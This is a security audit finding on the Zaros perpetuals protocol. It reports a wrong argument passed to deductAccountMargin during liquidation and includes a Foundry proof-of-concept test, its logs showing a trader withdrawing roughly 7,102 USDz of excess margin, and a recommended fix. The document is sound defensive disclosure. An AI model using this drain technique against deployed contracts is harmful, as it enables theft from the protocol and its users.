---
tags:
  - lang/solidity
  - sector/lending
  - sector/perpetuals
  - sector/token
  - platform/codehawks
  - has/github
  - has/poc
  - severity/high
  - vuln/logic/liquidation-logic
  - impact/loss-of-funds/direct-drain
  - novelty/variant
  - misassumption/math-is-safe
  - fix/redesign-logic
protocol: "[[Zaros]]"
auditors:
  - "[[0xStalin]]"
genome:
  - "[[liquidation-logic]]"
  - "[[direct-drain]]"
  - "[[variant]]"
  - "[[account-ownership]]"
  - "[[liquidation-underwater]]"
  - "[[timestamp-dependence]]"
---
# Wrong parameter passed in `TradingAccount::deductAccountMargin` function that results in excess margin withdrawal

- id: 37995
- impact: HIGH
- protocol: [[Zaros]]
- reporter: 0xStalin (Codehawks)
- source: N/A

## Summary


This bug report discusses an issue where the wrong parameter is passed in the `TradingAccount::deductAccountMargin` function, resulting in excess margin withdrawal. This is a high-risk issue that can have severe consequences. 

The problem occurs when a liquidation is executed, and the wrong parameter value for `pnlUsdX18` is passed in the `TradingAccount::deductAccountMargin` function. This causes the `marginBalanceUsdX18` to be inflated and the wrong tokens to be transferred. 

To demonstrate this issue, a Proof of Concept (POC) has been provided. This POC shows that a trader can receive 7,102 USDz as excess margin and 7,102 USDz less transferred to the `marginCollateralRecipient` upon liquidation. 

The impact of this bug is that the owner of the trading account can withdraw this excess margin. This can lead to a loss of funds for the platform and its users. 

To fix this issue, the absolute value of `accountTotalUnrealizedPnlUsdX18` should be passed as an argument for `pnlUsdX18` in the `TradingAccount::deductAccountMargin` function. This will prevent the inflation of `marginBalanceUsdX18` and ensure that the correct tokens are transferred. 

In conclusion, this bug can have severe consequences and should be fixed immediately to prevent any loss of funds. 

## Details

## Summary

In `LiquidationBranch::liquidateAccounts` function, wrong parameter value for `pnlUsdX18` passed in `TradingAccount::deductAccountMargin` function resulting in inflated `marginBalanceUsdX18` and wrong tokens transfer

## Vulnerability Details

When a liquidation is executed, in `LiquidationBranch::liquidateAccounts` function, `TradingAccount::deductAccountMargin` function is called. This function takes a parameter `pnlUsdX18` and uses this to adjust the margin balance with any unrealized PnL for the trading account that is being liquidated.

In [LiquidationBranch.sol#L158](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/branches/LiquidationBranch.sol#L158) `requiredMaintenanceMarginUsdX18` is passed as argument for `pnlUsdX18` instead of passing `accountTotalUnrealizedPnlUsdX18`.

```solidity

function liquidateAccounts(uint128[] calldata accountsIds) external {
    
    ....
    
    ctx.liquidatedCollateralUsdX18 = tradingAccount.deductAccountMargin({
        feeRecipients: FeeRecipients.Data({
            marginCollateralRecipient: globalConfiguration.marginCollateralRecipient,
            orderFeeRecipient: address(0),
            settlementFeeRecipient: globalConfiguration.liquidationFeeRecipient
        }),
@>      pnlUsdX18: requiredMaintenanceMarginUsdX18,
        orderFeeUsdX18: UD60x18_ZERO,
        settlementFeeUsdX18: ctx.liquidationFeeUsdX18
    });

    ....
}

```

## Impact

As a result, in `TradingAccount::withdrawMarginUsd` function, less tokens are transferred to `marginCollateralRecipient` and with the same amount `marginBalanceUsdX18` of the liquidated account is inflated. Eventually the owner of the trading account can withdraw this excess margin.

For demonstration purpose, if a trader opens a long position using 75,000 USDz, then upon liquidation he can receive 7,102 USDz as excess margin added to his account which he can withdraw and also 7,102 USDz less transferred to the `marginCollateralRecipient`.

Below is a coded Proof of Concept.

## POC

In `test/integration/perpetuals/liquidation-branch/liquidateAccounts/liquidateAccounts.t.sol` add below code. Run the test `forge test --mt test_inLiquidationWrongTokenAmountTransferWrongMarginBalance -vv`

```diff
++ import { TradingAccount } from "@zaros/perpetuals/leaves/TradingAccount.sol";
++ import { MockPriceFeed } from "test/mocks/MockPriceFeed.sol";
++ import {console} from "forge-std/console.sol";
++ import { IERC20 } from "@openzeppelin/token/ERC20/ERC20.sol";

++ function test_inLiquidationWrongTokenAmountTransferWrongMarginBalance()
++        external
++        givenTheSenderIsARegisteredLiquidator
++        whenTheAccountsIdsArrayIsNotEmpty
++        givenAllAccountsExist
++    {
++        
++        TestFuzz_GivenThereAreLiquidatableAccountsInTheArray_Context memory ctx;
++        ctx.fuzzMarketConfig = getFuzzMarketConfig(INITIAL_MARKET_ID);
++        vm.assume(ctx.fuzzMarketConfig.marketId != ctx.secondMarketConfig.marketId);
++
++        uint256 amountOfTradingAccounts = 1;
++        uint256 timeDelta = 1 days;
++        bool isLong = true;
++
++        ctx.marginValueUsd = 150_000e18 / amountOfTradingAccounts;
++        ctx.initialMarginRate = ctx.fuzzMarketConfig.imr;
++        deal({ token: address(usdz), to: users.naruto.account, give: ctx.marginValueUsd });
++        ctx.accountsIds = new uint128[](amountOfTradingAccounts + 2);
++        ctx.accountMarginValueUsd = ctx.marginValueUsd / (amountOfTradingAccounts + 1);
++
++        for (uint256 i; i < amountOfTradingAccounts; i++) {
++            ctx.tradingAccountId = createAccountAndDeposit(ctx.accountMarginValueUsd, address(usdz));
++
++            console.log(" ");
++            console.log("AFTER ACCOUNT CREATION AND DEPOSIT");
++            console.log("----------------------------------");
++            _wyLogUpnl(ctx.tradingAccountId);
++            _wyLogMarginInfo(ctx.tradingAccountId);
++
++            openPosition(
++                ctx.fuzzMarketConfig,
++                ctx.tradingAccountId,
++                ctx.initialMarginRate,
++                ctx.accountMarginValueUsd,
++                isLong
++            );
++
++            ctx.accountsIds[i] = ctx.tradingAccountId;
++            deal({ token: address(usdz), to: users.naruto.account, give: ctx.marginValueUsd });
++        }
++        
++        uint256 indexPrice = getPrice(
++            MockPriceFeed(marketsConfig[ctx.fuzzMarketConfig.marketId].priceAdapter)
++        ).intoUint256();
++
++        console.log(" ");
++        console.log("AFTER CREATING POSITION");
++        console.log("-----------------------");
++        console.log("indexPrice: ", indexPrice / 1e18);
++        _wyLogUpnl(ctx.accountsIds[0]);
++        _wyLogMarginInfo(ctx.accountsIds[0]);
++
++        setAccountsAsLiquidatable(ctx.fuzzMarketConfig, isLong);
++
++        indexPrice = getPrice(
++            MockPriceFeed(marketsConfig[ctx.fuzzMarketConfig.marketId].priceAdapter)).intoUint256();
++
++        console.log(" ");
++        console.log("AFTER SETTING POSITION LIQUIDATABLE");
++        console.log("-----------------------------------");
++        console.log("indexPrice: ", indexPrice / 1e18);
++        _wyLogUpnl(ctx.accountsIds[0]);
++        _wyLogMarginInfo(ctx.accountsIds[0]);
++
++        ctx.nonLiquidatableTradingAccountId = createAccountAndDeposit(ctx.accountMarginValueUsd, address(usdz));
++        ctx.accountsIds[amountOfTradingAccounts] = ctx.nonLiquidatableTradingAccountId;
++
++        changePrank({ msgSender: liquidationKeeper });
++        skip(timeDelta);
++
++        ctx.expectedLastFundingRate = perpsEngine.getFundingRate(ctx.fuzzMarketConfig.marketId).intoInt256();
++        ctx.expectedLastFundingTime = block.timestamp;
++
++        perpsEngine.liquidateAccounts(ctx.accountsIds);
++        
++        indexPrice = getPrice(
++            MockPriceFeed(marketsConfig[ctx.fuzzMarketConfig.marketId].priceAdapter)).intoUint256();
++        
++        console.log(" ");
++        console.log("AFTER LIQUIDATION BEFORE MARGIN WITHDRAWAL");
++        console.log("------------------------------------------");
++        console.log("indexPrice: ", indexPrice / 1e18);
++        _wyLogUpnl(ctx.accountsIds[0]);
++        _wyLogMarginInfo(ctx.accountsIds[0]);
++
++        UD60x18 finalAvailableMargin = perpsEngine.getAccountMarginCollateralBalance(ctx.accountsIds[0], address(usdz));
++
++        console.log('USDZ balance of trader', IERC20(address(usdz)).balanceOf(users.naruto.account) / 1e18);
++        
++        changePrank({ msgSender: users.naruto.account });
++
++        perpsEngine.withdrawMargin(ctx.accountsIds[0], address(usdz), finalAvailableMargin.intoUint256());
++
++        console.log(" ");
++        console.log("AFTER MARGIN WITHDRAWAL");
++        console.log("-----------------------");
++        _wyLogUpnl(ctx.accountsIds[0]);
++        _wyLogMarginInfo(ctx.accountsIds[0]);
++        console.log('USDZ balance of trader', IERC20(address(usdz)).balanceOf(users.naruto.account) / 1e18);
++
++    }
++
++    function _wyLogMarginInfo(uint128 _accountsId) internal view {
++        
++        (
++            SD59x18 marginBalanceUsdX18,
++            UD60x18 initialMarginUsdX18,
++            UD60x18 maintenanceMarginUsdX18,
++            SD59x18 availableMarginUsdX18
++        ) = perpsEngine.getAccountMarginBreakdown(_accountsId);
++
++        console.log("marginBalanceUsdX18: ",marginBalanceUsdX18.intoInt256() / 1e18);
++        console.log("initialMarginUsdX18: ",initialMarginUsdX18.intoUint256() / 1e18);
++        console.log("maintenanceMarginUsdX18: ",maintenanceMarginUsdX18.intoUint256() / 1e18);
++        console.log("availableMarginUsdX18: ",availableMarginUsdX18.intoInt256() / 1e18);
++    }
++
++    function _wyLogUpnl(uint128 _accountsId) internal view {
++        SD59x18 accountTotalUnrealizedPnlUsdX18Before = perpsEngine.getAccountTotalUnrealizedPnl(_accountsId);
++        console.log("accountTotalUnrealizedPnlUsdX18: ", accountTotalUnrealizedPnlUsdX18Before.intoInt256() / 1e18);
++    }

```

```bash

Ran 1 test for test/integration/perpetuals/liquidation-branch/liquidateAccounts/liquidateAccounts.t.sol:LiquidateAccounts_Integration_Test
[PASS] test_inLiquidationWrongTokenAmountTransferWrongMarginBalance() (gas: 1819897)
Logs:
  AFTER ACCOUNT CREATION AND DEPOSIT
  ----------------------------
---
---
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  75000
  initialMarginUsdX18:  0
  maintenanceMarginUsdX18:  0
  availableMarginUsdX18:  75000
  ctx.pnlDeductedUsdX18:  0
   
  AFTER CREATING POSITION
  -----------------
---
---
  indexPrice:  100000
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  69478
  initialMarginUsdX18:  68997
  maintenanceMarginUsdX18:  34498
  availableMarginUsdX18:  480
   
  AFTER SETTING POSITION LIQUIDATABLE
  -----------------------------
---
---
  indexPrice:  99400
  accountTotalUnrealizedPnlUsdX18:  -41398
  marginBalanceUsdX18:  28079
  initialMarginUsdX18:  68583
  maintenanceMarginUsdX18:  34291
  availableMarginUsdX18:  -40504
   
  LIQUIDATION IN PROCESS
  ----------------
---
---
  marginCollateralBalanceX18:  69473
  requiredMarginInCollateralX18:  34291
  ctx.pnlDeductedUsdX18:  34291
  ctx.liquidqationFeeUsd18 5
  ctx.liquidatedCollateralUsdX18 34296
   
  AFTER LIQUIDATION BEFORE MARGIN WITHDRAWAL
  ------------------------------------
---
---
  indexPrice:  99400
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  35181
  initialMarginUsdX18:  0
  maintenanceMarginUsdX18:  0
  availableMarginUsdX18:  35181
  USDZ balance of trader 75000
   
  AFTER MARGIN WITHDRAWAL
  -----------------
---
---
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  0
  initialMarginUsdX18:  0
  maintenanceMarginUsdX18:  0
  availableMarginUsdX18:  0
  USDZ balance of trader 110181

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.97ms (2.87ms CPU time)
```

After creating the position `marginBalanceUsdX18` was 69,478, after setting the position as liquidatable the `marginBalanceUsdX18` fell to 28,079 because of unrealized loss of 41,398 but after liquidation `marginBalanceUsdX18` increased to 35,181 with a differential of 7,102 and later the excess margin is withrawn by the trading account owner.

## Tools Used

Manual review

## Recommendations

In `TradingAccount::deductAccountMargin` function, absolute value of `accountTotalUnrealizedPnlUsdX18` with `UD60x18` type conversion should be passed as argument for `pnlUsdX18`.

```diff
function liquidateAccounts(uint128[] calldata accountsIds) external {
    
    ....
    
    ctx.liquidatedCollateralUsdX18 = tradingAccount.deductAccountMargin({
        feeRecipients: FeeRecipients.Data({
            marginCollateralRecipient: globalConfiguration.marginCollateralRecipient,
            orderFeeRecipient: address(0),
            settlementFeeRecipient: globalConfiguration.liquidationFeeRecipient
        }),
--      pnlUsdX18: requiredMaintenanceMarginUsdX18,
++      pnlUsdX18: accountTotalUnrealizedPnlUsdX18.abs().intoUD60x18()
        orderFeeUsdX18: UD60x18_ZERO,
        settlementFeeUsdX18: ctx.liquidationFeeUsdX18
    });

    ....
}
```

```bash
Ran 1 test for test/integration/perpetuals/liquidation-branch/liquidateAccounts/liquidateAccounts.t.sol:LiquidateAccounts_Integration_Test
[PASS] test_inLiquidationWrongTokenAmountTransferWrongMarginBalance() (gas: 1820081)
Logs:
  AFTER ACCOUNT CREATION AND DEPOSIT
  ----------------------------
---
---
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  75000
  initialMarginUsdX18:  0
  maintenanceMarginUsdX18:  0
  availableMarginUsdX18:  75000
  ctx.pnlDeductedUsdX18:  0
   
  AFTER CREATING POSITION
  -----------------
---
---
  indexPrice:  100000
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  69478
  initialMarginUsdX18:  68997
  maintenanceMarginUsdX18:  34498
  availableMarginUsdX18:  480
   
  AFTER SETTING POSITION LIQUIDATABLE
  -----------------------------
---
---
  indexPrice:  99400
  accountTotalUnrealizedPnlUsdX18:  -41398
  marginBalanceUsdX18:  28079
  initialMarginUsdX18:  68583
  maintenanceMarginUsdX18:  34291
  availableMarginUsdX18:  -40504
   
  LIQUIDATION IN PROCESS
  ----------------
---
---
  marginCollateralBalanceX18:  69473
  requiredMarginInCollateralX18:  41399
  ctx.pnlDeductedUsdX18:  41399
  ctx.liquidqationFeeUsd18 5
  ctx.liquidatedCollateralUsdX18 41404
   
  AFTER LIQUIDATION BEFORE MARGIN WITHDRAWAL
  ------------------------------------
---
---
  indexPrice:  99400
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  28073
  initialMarginUsdX18:  0
  maintenanceMarginUsdX18:  0
  availableMarginUsdX18:  28073
  USDZ balance of trader 75000
   
  AFTER MARGIN WITHDRAWAL
  -----------------
---
---
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  0
  initialMarginUsdX18:  0
  maintenanceMarginUsdX18:  0
  availableMarginUsdX18:  0
  USDZ balance of trader 103073
```

As you can see, the only difference in the `marginBalanceUsdX18` should be the deduction of `liquidqationFeeUsd18`.
